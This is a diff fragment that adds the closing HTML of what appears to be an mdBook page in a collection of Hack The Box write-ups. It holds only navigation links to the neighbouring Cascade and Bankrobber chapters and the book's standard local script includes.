+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="HTB-Windows-Medium-Cascade.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="HTB-Windows-Insane-Bankrobber.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="HTB-Windows-Medium-Cascade.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="HTB-Windows-Insane-Bankrobber.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
